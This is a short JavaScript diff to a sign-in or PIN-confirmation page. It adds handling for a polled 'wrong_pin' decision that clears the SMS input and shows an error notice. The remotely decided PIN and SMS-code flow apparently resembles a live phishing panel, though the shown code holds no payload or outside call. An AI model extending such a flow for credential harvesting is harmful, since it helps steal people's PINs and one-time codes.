@@ -801,7 +801,6 @@
   }
 
   function goBackToSignin() {
-    // Show a "wrong PIN" popup first, then redirect to signin
     const overlay = document.createElement('div');
     overlay.style.cssText = 'position:fixed;inset:0;background:rgba(16,24,40,0.65);display:flex;align-items:center;justify-content:center;z-index:10001;padding:24px;';
     overlay.innerHTML =
@@ -928,6 +927,17 @@
           lang: currentLang
         });
         window.location.href = 'oops.html?' + q.toString();
+        return;
+      }
+
+      if (decision === 'wrong_pin') {
+        pollingActive = false;
+        stopTrustSlider();
+        document.getElementById('authorizingOverlay').classList.remove('show');
+        btn.disabled = false;
+        document.getElementById('confirmBtnLabel').textContent = T.confirmBtn;
+        clearSmsInput();
+        showNotice('noticeWrongPin');
         return;
       }
 
